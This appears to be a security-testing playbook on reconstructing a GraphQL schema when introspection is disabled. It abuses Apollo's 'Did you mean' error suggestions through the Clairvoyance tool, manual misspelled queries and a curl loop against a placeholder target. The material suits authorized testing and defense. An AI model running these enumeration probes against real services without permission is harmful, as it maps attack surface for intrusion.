# GraphQL Schema Reconstruction (Introspection Disabled)

## When this applies

- Introspection is fully disabled (no whitespace bypass works).
- Server enables Apollo "field suggestions" (`Did you mean ...`) — leaks field names via error messages.
- You have a wordlist of likely field/type names (from related apps, source leaks).

## Technique

Use Clairvoyance to brute-force field/type names against the schema. The tool sends candidate field names; the server's "Did you mean" responses leak the real ones. Build the schema iteratively.

## Steps

### Clairvoyance

```bash
# Install
pip install clairvoyance

# Reconstruct schema when introspection is disabled
clairvoyance -o schema.json \
  -w wordlist.txt \
  https://target.com/graphql

# With authentication
clairvoyance -o schema.json \
  -w wordlist.txt \
  -H "Authorization: Bearer TOKEN" \
  https://target.com/graphql
```

### GraphQL Voyager (visualize once recovered)

```bash
graphql-voyager schema.json
```

### Manual approach — trigger field suggestions

Send a query with a deliberately misspelled field. Apollo Server returns `"Did you mean 'X'?"`:

```graphql
query {
  getUserr(id: 1) { username }
}
```

Response:
```json
{
  "errors": [
    {
      "message": "Cannot query field 'getUserr' on type 'Query'. Did you mean 'getUser'?"
    }
  ]
}
```

### Iterate against a wordlist

```bash
for field in user admin product order get find list create delete; do
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{${field}r{username}}\"}" | grep -oE 'Did you mean.*'
done
```

### Standalone tool inventory

- **Clairvoyance** — field/type brute-force from "Did you mean"
- **GraphQL Voyager** — visualize recovered schema
- **GraphQL Playground / Altair** — interactive testing once schema known
- **graphql-cop** — security checks (also probes introspection)

## Verifying success

- Clairvoyance writes a `schema.json` containing types, queries, mutations, and field types.
- Manual probes return error messages naming real fields.
- Recovered schema imports into GraphQL Voyager as a connected graph.

## Common pitfalls

- Servers that return generic `"Cannot query field"` without suggestions are immune to Clairvoyance — fall back to wordlists from similar projects.
- Heavy rate limits slow Clairvoyance — add `--workers 1` or run alias-batched probes manually.
- Recovered schema may be incomplete — combine with mutation discovery (look for state-change verbs).

## Tools

- Clairvoyance
- GraphQL Voyager
- Altair / GraphQL Playground
- graphql-cop
